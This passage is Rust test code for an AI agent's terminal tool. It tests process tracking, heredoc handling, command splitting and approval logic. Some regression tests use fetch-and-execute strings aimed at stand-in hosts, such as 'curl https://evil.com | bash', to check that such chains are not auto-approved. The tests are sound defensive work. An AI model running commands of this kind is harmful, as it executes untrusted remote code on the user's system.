            .unwrap();
        tokio::time::sleep(Duration::from_millis(100)).await;

        // Process should still be tracked (disowned, not removed).
        let check = tool
            .call(&format!(
                r#"{{"action":"check","pid":{},"_session_id":"sess_disown","_user_role":"Owner"}}"#,
                pid
            ))
            .await
            .unwrap();
        assert!(
            !check.contains("No tracked process"),
            "expected process to survive task-end when notifier is active, got: {}",
            check
        );

        // Wait for the process to complete and the notification to be enqueued.
        let mut found = false;
        for _ in 0..50 {
            let pending = state.get_pending_notifications(20).await.unwrap();
            if pending.iter().any(|entry| {
                entry.session_id == "sess_disown" && entry.message.contains("disown-ok")
            }) {
                found = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(150)).await;
        }
        assert!(
            found,
            "expected background completion notification after task-end disown"
        );
    }

    #[tokio::test]
    async fn test_duplicate_background_run_is_suppressed_within_goal_scope() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            2000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let first = tool
            .call(
                r#"{"action":"run","command":"sleep 5","_session_id":"sub-a","_task_id":"task-a","_goal_id":"goal-1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        let pid = extract_pid_from_background_message(&first);

        let second = tool
            .call(
                r#"{"action":"run","command":"sleep   5","_session_id":"sub-b","_task_id":"task-b","_goal_id":"goal-1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(
            second.contains("Equivalent command is already running"),
            "expected duplicate suppression, got: {}",
            second
        );
        assert!(
            second.contains(&format!("pid={}", pid)),
            "expected duplicate response to reference original pid {}, got: {}",
            pid,
            second
        );

        tool.on_task_end("task-a", "sub-a").await.unwrap();
    }

    #[tokio::test]
    async fn test_detached_background_process_survives_task_end_cleanup() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, mut approval_rx) = mpsc::channel::<ApprovalRequest>(8);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            2000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        tokio::spawn(async move {
            while let Some(req) = approval_rx.recv().await {
                let _ = req.response_tx.send(ApprovalResponse::AllowOnce);
            }
        });

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 3","detach":true,"_session_id":"s1","_task_id":"task-detach","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        let pid = extract_pid_from_background_message(&response);
        assert!(response.contains("Moved to background (pid="));
        assert!(response.contains("Detached mode is enabled"));

        tool.on_task_end("task-detach", "s1").await.unwrap();
        let check = tool
            .call(&format!(
                r#"{{"action":"check","pid":{},"_session_id":"s1","_user_role":"Owner"}}"#,
                pid
            ))
            .await
            .unwrap();
        assert!(
            !check.contains("No tracked process"),
            "detached process should not be cleaned by task-end hook"
        );

        let _ = tool
            .call(&format!(
                r#"{{"action":"kill","pid":{},"_session_id":"s1","_user_role":"Owner"}}"#,
                pid
            ))
            .await;
    }

    #[tokio::test]
    async fn test_daemon_command_returns_immediately_without_background_tracking() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, mut approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            2, // 2 second timeout
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        // Auto-approve the daemonization approval request
        tokio::spawn(async move {
            if let Some(req) = approval_rx.recv().await {
                let _ = req.response_tx.send(ApprovalResponse::AllowOnce);
            }
        });

        let start = Instant::now();
        let response = tool
            .call(
                r#"{"action":"run","command":"nohup sleep 5 & echo $!","detach":true,"_session_id":"s1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        let elapsed = start.elapsed();

        // Should return promptly (within the timeout + small margin) rather than
        // entering the infinite background tracking loop.
        assert!(
            elapsed < Duration::from_secs(5),
            "daemon command should return within timeout, not stall; took {:?}",
            elapsed
        );
        assert!(
            response.contains("Detached background command launched"),
            "expected daemon early-return message, got: {}",
            response
        );
        assert!(
            response.contains("pid="),
            "expected pid in response, got: {}",
            response
        );
    }

    #[tokio::test]
    async fn test_large_heredoc_soft_blocked() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        // Build a command >500 chars with UNQUOTED heredoc (should be soft-blocked)
        let large_content = "x".repeat(600);
        let command = format!("cat > /tmp/test.html << EOF\n{}\nEOF", large_content);
        let args = serde_json::json!({
            "action": "run",
            "command": command,
            "_session_id": "s1",
            "_user_role": "Owner"
        });

        let response = tool.call(&args.to_string()).await.unwrap();
        assert!(
            response.contains("write_file"),
            "expected heredoc soft-block to recommend write_file, got: {}",
            response
        );
        assert!(
            response.contains("unreliable"),
            "expected heredoc soft-block message, got: {}",
            response
        );
    }

    #[tokio::test]
    async fn test_large_quoted_heredoc_allowed() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        // Build a command >500 chars with QUOTED heredoc (should be allowed)
        let large_content = "echo 'hello'";
        let command = format!(
            "cat > /tmp/test.py << 'PYEOF'\n{}\nPYEOF",
            large_content.repeat(50)
        );
        let args = serde_json::json!({
            "action": "run",
            "command": command,
            "_session_id": "s1",
            "_user_role": "Owner"
        });

        let response = tool.call(&args.to_string()).await.unwrap();
        assert!(
            !response.contains("unreliable"),
            "quoted heredoc should NOT be soft-blocked, got: {}",
            response
        );
    }

    #[test]
    fn test_split_command_segments_respects_quotes() {
        // Simple chained command — should split at &&
        let segs = split_command_segments("cd ~/projects && python3 test.py");
        assert_eq!(segs, vec!["cd ~/projects", "python3 test.py"]);

        // Semicolons inside double quotes — should NOT split
        let segs = split_command_segments(r#"python3 -c "import os; print(os.getcwd())""#);
        assert_eq!(segs.len(), 1);
        assert!(segs[0].contains("import os; print"));

        // Semicolons inside single quotes — should NOT split
        let segs = split_command_segments("python3 -c 'x=1; y=2; print(x+y)'");
        assert_eq!(segs.len(), 1);

        // Mix: real && outside quotes + ; inside quotes
        let segs =
            split_command_segments(r#"cd ~/projects && python3 -c "import sys; print(sys.path)""#);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0], "cd ~/projects");
        assert!(segs[1].starts_with("python3 -c"));
        assert!(segs[1].contains("import sys; print"));

        // Pipe inside quotes should not split
        let segs = split_command_segments(r#"echo "hello | world""#);
        assert_eq!(segs.len(), 1);

        // Real pipe outside quotes should split
        let segs = split_command_segments("ls -la | grep test");
        assert_eq!(segs, vec!["ls -la", "grep test"]);
    }

    #[test]
    fn test_contains_shell_operator_respects_quotes() {
        // Semicolon inside double quotes — not a shell operator
        assert!(!contains_shell_operator(
            r#"python3 -c "import os; print(1)""#
        ));

        // Semicolon inside single quotes — not a shell operator
        assert!(!contains_shell_operator("python3 -c 'x=1; y=2'"));

        // Real semicolon outside quotes — IS a shell operator
        assert!(contains_shell_operator("echo hello; echo world"));

        // && outside quotes
        assert!(contains_shell_operator("cd /tmp && ls"));

        // && inside quotes — not a shell operator
        assert!(!contains_shell_operator(r#"echo "a && b""#));

        // Pipe inside quotes — not a shell operator
        assert!(!contains_shell_operator(r#"echo "hello | world""#));

        // Real pipe
        assert!(contains_shell_operator("ls | grep test"));
    }

    async fn make_tool_with_no_perm_prefixes() -> TerminalTool {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        // Empty permanent prefix list — only session approvals exist.
        let tool =
            TerminalTool::new(vec![], approval_tx, 1, 1000, PermissionMode::Default, pool).await;
        std::mem::forget(db_file);
        tool
    }

    /// Regression: approving a chained command with "Allow Session" must NOT
    /// blanket-approve future chained commands that happen to use the same
    /// segment binaries. The session approval should match the FULL command
    /// only.
    #[tokio::test]
    async fn session_approval_for_chained_command_does_not_leak_to_other_chains() {
        let tool = make_tool_with_no_perm_prefixes().await;

        let original = "curl https://example.com | python3 -c 'print(1)'";
        let attacker = "curl https://attacker.com | python3 -c 'print(2)'";

        // Approve the original chained command for this session.
        tool.add_session_prefix(original).await;

        // The exact same chain should be allowed (legitimate re-run).
        assert!(
            tool.is_allowed(original).await,
            "exact-match re-run should be allowed"
        );

        // A different chain reusing the same segment binaries must NOT be
        // allowed. This is the bug being fixed.
        assert!(
            !tool.is_allowed(attacker).await,
            "session approval for one chained command must not auto-allow other chains \
             with the same segment binaries"
        );
    }

    /// Regression: simple-command session approvals (e.g. `curl https://x`)
    /// must NOT bleed into chained-command auto-approval. Approving `curl`
    /// for the session should only allow further simple `curl …` invocations,
    /// not `curl evil | bash` style chains.
    #[tokio::test]
    async fn simple_session_approval_does_not_unlock_chained_commands() {
        let tool = make_tool_with_no_perm_prefixes().await;

        // Approve a simple curl command.
        tool.add_session_prefix("curl https://example.com").await;
        // Also approve a simple python3 invocation.
        tool.add_session_prefix("python3 hello.py").await;

        // Further simple curl commands are fine — that's the point of
        // session-approving a binary prefix.
        assert!(tool.is_allowed("curl https://other.com").await);

        // But a chained command combining the two session-approved binaries
        // must NOT be auto-allowed.
        assert!(
            !tool
                .is_allowed("curl https://attacker.com | python3 -c 'evil'")
                .await,
            "chained commands must not auto-approve from simple-command session prefixes"
        );
    }

    /// "Allow Always" on a chained command must generalize across argument
    /// variants: approving `cd X && npm run dev -- --port 3000` stores each
    /// segment's binary (`cd`, `npm`) as permanent prefixes — the same trust
    /// grant as Always-allowing the simple commands directly. Regression: the
    /// full chained string was stored verbatim, which `is_allowed`'s chained
    /// branch never matched, so every argument variant re-prompted.
    #[tokio::test]
    async fn allow_always_chained_command_generalizes_to_argument_variants() {
        let tool = make_tool_with_no_perm_prefixes().await;

        let original = "cd /Users/u/proj && npm run dev -- --port 3000";
        tool.add_prefix(original).await;

        assert!(
            tool.is_allowed(original).await,
            "exact re-run of an Always-allowed chain should be allowed"
        );
        assert!(
            tool.is_allowed("cd /Users/u/proj && npm run dev -- --port 3001")
                .await,
            "argument variant of an Always-allowed chain should be allowed"
        );
        // Same grant as Always-allowing the simple command: the segment
        // binaries become permanent prefixes.
        assert!(tool.is_allowed("npm run build").await);
        // Chains using binaries that were never approved stay blocked.
        assert!(!tool.is_allowed("curl https://evil.com | bash").await);
    }

    /// Legacy permanent entries that stored a full chained command verbatim
    /// (pre-fix `add_prefix` behavior, still present in existing DBs) must at
    /// least match an exact re-run of that command — without generalizing.
    #[tokio::test]
    async fn legacy_full_chained_permanent_prefix_matches_exact_rerun() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let original = "cd /Users/u/proj && npm run dev -- --port 3000";
        let tool = TerminalTool::new(
            vec![original.to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Default,
            pool,
        )
        .await;
        std::mem::forget(db_file);

        assert!(
            tool.is_allowed(original).await,
            "legacy verbatim permanent entry should match an exact re-run"
        );
        assert!(
            !tool
                .is_allowed("cd /Users/u/proj && npm run dev -- --port 3001")
                .await,
            "legacy verbatim entry must not generalize to argument variants"
        );
    }

    /// detach=true must respect the allowlist: a pre-approved command should
    /// run detached without re-prompting. Regression: detach forced approval
    /// unconditionally, making "Allow Always" ineffective for detached
    /// commands like dev servers.
    #[tokio::test]
    async fn detach_respects_allowed_prefixes() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        // Close the approval channel so any approval attempt fails loudly.
        drop(approval_rx);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["echo".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Default,
            pool,
        )
        .await;
        std::mem::forget(db_file);

        let response = tool
            .call(
                r#"{"action":"run","command":"echo hi","detach":true,"_session_id":"s1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(
            !response.contains("Could not get approval"),
            "pre-approved detached command should not require approval, got: {}",
            response
        );
    }

    /// Commands from untrusted sources must still force approval even when
    /// the command is allowlisted and detached — the untrusted-source check
    /// takes precedence over allowlist short-circuits.
    #[tokio::test]
    async fn untrusted_source_forces_approval_even_when_allowed_and_detached() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        drop(approval_rx);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["echo".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Default,
            pool,
        )
        .await;
        std::mem::forget(db_file);

        let response = tool
            .call(
                r#"{"action":"run","command":"echo hi","detach":true,"_untrusted_source":true,"_session_id":"s1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(
            response.contains("Could not get approval"),
            "untrusted-source command must force approval even when allowlisted, got: {}",
            response
        );
    }

    #[tokio::test]
    async fn terminal_blocks_unbounded_disk_scan_without_spawning() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(
                db_file.path().to_str().unwrap(),
                100,
                None,
                embedding_service,
            )
            .await
            .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let resp = tool
            .call(r#"{"action":"run","command":"du -a / 2>/dev/null | sort -rn | head -n 10","_session_id":"s","_user_role":"Owner"}"#)
            .await
            .unwrap();
        assert!(
            resp.to_lowercase().contains("scoped")
                || resp.to_lowercase().contains("narrower")
                || resp.contains("Blocked"),
            "expected scan guidance, got: {resp}"
        );
        // It must NOT have spawned/backgrounded a process.
        assert!(
            !resp.contains("Moved to background"),
            "guard must block before spawning"
        );

        // A scoped command is NOT blocked by this guard (it may still run/echo).
        let ok = tool
            .call(r#"{"action":"run","command":"echo scoped-ok","_session_id":"s","_user_role":"Owner"}"#)
            .await
            .unwrap();
        assert!(ok.contains("scoped-ok"));
    }

    // ─────────────────────────────────────────────────────────────────────────
    // P2.3 terminal tests
    // ─────────────────────────────────────────────────────────────────────────

    /// Helper that creates a TerminalTool with an open-ended approval channel
    /// (receiver kept alive) so approval requests don't immediately error.
    /// Returns (tool, approval_rx) — keep approval_rx alive for the test duration.
    async fn make_tool_with_open_approval_channel(
    ) -> (TerminalTool, tokio::sync::mpsc::Receiver<ApprovalRequest>) {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, approval_rx) = mpsc::channel::<ApprovalRequest>(4);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool =
            TerminalTool::new(vec![], approval_tx, 1, 1000, PermissionMode::Default, pool).await;
        std::mem::forget(db_file);
        (tool, approval_rx)
    }

    /// correction_preapproved=true bypasses the `_untrusted_source` prompt for
    /// a safe `action="run"` command.
    ///
    /// Without preapproval, `_untrusted_source=true` forces an approval request
    /// which blocks until the channel is answered.  With preapproval the command
    /// must run without hitting the approval channel.
    #[tokio::test]
    async fn correction_preapproval_bypasses_untrusted_source_for_run() {
        // Close the approval receiver so any approval attempt errors immediately.
        // If the preapproval gate works, the tool should NOT attempt approval and
        // should succeed with the command output.
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        drop(approval_rx); // <-- closed; any approval attempt would error
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool =
            TerminalTool::new(vec![], approval_tx, 1, 1000, PermissionMode::Default, pool).await;
        std::mem::forget(db_file);

        // args include _untrusted_source=true which would normally force approval.
        let args = r#"{"action":"run","command":"echo preapproved-ok","_untrusted_source":true,"_session_id":"s1","_user_role":"Owner"}"#;

        let exec_ctx = ToolExecutionContext {
            correction_preapproved: true,
        };

        let result = tool
            .call_with_execution_context(args, None, exec_ctx)
            .await
            .expect("preapproved run should succeed without approval");

        assert!(
            result.output.contains("preapproved-ok"),
            "preapproved run should execute the command, got: {}",
            result.output
        );
        assert!(
            !result.output.contains("Could not get approval"),
            "preapproved run must not have hit the approval gate, got: {}",
            result.output
        );
    }

    /// correction_preapproved=true does NOT bypass approval for non-run actions.
    ///
    /// `trust_all` must require an explicit owner interaction even when
    /// correction_preapproved is set — it cannot be silently executed by the
    /// correction gate.
    #[tokio::test]
    async fn correction_preapproval_does_not_bypass_non_run_actions() {
        // trust_all doesn't use the approval channel — it just returns output.
        // Test that trust_all still behaves correctly (runs, not blocked) when
        // preapproved, but also that check/kill don't crash without pid.
        // The key invariant: non-run actions go through the normal path.
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool =
            TerminalTool::new(vec![], approval_tx, 1, 1000, PermissionMode::Default, pool).await;
        std::mem::forget(db_file);

        let exec_ctx = ToolExecutionContext {
            correction_preapproved: true,
        };

        // "check" with no pid should return an error (normal path), not be silently
        // auto-approved or crash.  correction_preapproved must not turn this into
        // a run action.
        let check_result = tool
            .call_with_execution_context(
                r#"{"action":"check","_session_id":"s1","_user_role":"Owner"}"#,
                None,
                exec_ctx,
            )
            .await;

        // Should be Err (pid required) or contain an error message — never a panic
        // and never treated as "run".
        match check_result {
            Err(e) => assert!(
                e.to_string().contains("pid"),
                "check without pid should fail with pid-related error, got: {}",
                e
            ),
            Ok(outcome) => assert!(
                outcome.output.contains("pid") || outcome.output.contains("required"),
                "check without pid output should mention pid, got: {}",
                outcome.output
            ),
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // P2.5-C: next ordinary unsafe command still prompts after a preapproved call
    //
    // After a correction-preapproved call succeeds, the next call with
    // correction_preapproved=false and _untrusted_source=true must still reach
    // the approval channel.  We prove this by:
    //   1. Making a preapproved call (approval_rx has a closed receiver — no
    //      approval request should arrive).
    //   2. Dropping that tool and creating a fresh tool with an open approval
    //      channel.
    //   3. Calling with correction_preapproved=false + _untrusted_source=true.
    //   4. Asserting that an approval request IS received on the channel.
    //
    // The freshness of the tool is intentional: TerminalTool's session_approved
    // HashSet is per-instance.  The structural invariant is that correction_
    // preapproved never touches session_approved (see terminal.rs:2853 — the
    // `else if correction_preapproved` branch does NOT call add_session_prefix
    // or add_prefix; it only sets needs_approval=false and logs).  Therefore
    // even on the same instance, no residue would pollute session_approved.
    //
    // Using a fresh instance makes the "still prompts" proof self-contained and
    // independent of any cross-call state.
    // ─────────────────────────────────────────────────────────────────────────
    #[tokio::test]
    async fn test_next_ordinary_unsafe_command_still_prompts() {
        // --- Part 1: correction-preapproved call on a tool with a closed receiver ---
        // We intentionally close the approval_rx; if the preapproval gate works,
        // no approval request is sent and the command executes.
        {
            let db_file = tempfile::NamedTempFile::new().unwrap();
            let db_url = format!("sqlite:{}", db_file.path().display());
            let pool = SqlitePool::connect(&db_url).await.unwrap();
            let (approval_tx_raw, approval_rx) = mpsc::channel::<ApprovalRequest>(1);
            drop(approval_rx); // closed — any approval attempt would error
            let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
            let tool =
                TerminalTool::new(vec![], approval_tx, 1, 1000, PermissionMode::Default, pool)
                    .await;
            std::mem::forget(db_file);

            let exec_ctx = ToolExecutionContext {
                correction_preapproved: true,
            };
            let result = tool
                .call_with_execution_context(
                    r#"{"action":"run","command":"echo p25-preapproved","_untrusted_source":true,"_session_id":"p25-sess","_user_role":"Owner"}"#,
                    None,
                    exec_ctx,
                )
                .await
                .expect("preapproved run must succeed without hitting closed approval channel");
            assert!(
                result.output.contains("p25-preapproved"),
                "preapproved call must execute the command, got: {}",
                result.output
            );
        } // tool dropped; any session_approved state is dropped with it

        // --- Part 2: ordinary (non-preapproved) call must reach the approval channel ---
        // Fresh tool with an OPEN approval channel.  We answer on a background task
        // so the call can complete; we then verify the request was received.
        let (tool, mut approval_rx) = make_tool_with_open_approval_channel().await;

        // Answer the approval request from a background task so the tool call
        // can complete without blocking forever.
        tokio::spawn(async move {
            if let Some(req) = approval_rx.recv().await {
                // Deny it — we only care that the request WAS sent, not the outcome.
                let _ = req.response_tx.send(ApprovalResponse::Deny);
            }
        });

        // This call has correction_preapproved=false and _untrusted_source=true.
        // The untrusted-source branch forces needs_approval=true, so an approval
        // request MUST be sent to the channel.
        let result = tool
            .call_with_execution_context(
                r#"{"action":"run","command":"echo ordinary-unsafe","_untrusted_source":true,"_session_id":"p25-sess","_user_role":"Owner"}"#,
                None,
                ToolExecutionContext {
                    correction_preapproved: false,
                },
            )
            .await
            .expect("call should complete (denied, not error)");

        assert!(
            result.output.contains("denied") || result.output.contains("Deny"),
            "ordinary unsafe command must have gone through the approval gate \
             (expected denial message), got: {}",
            result.output
        );
    }
}
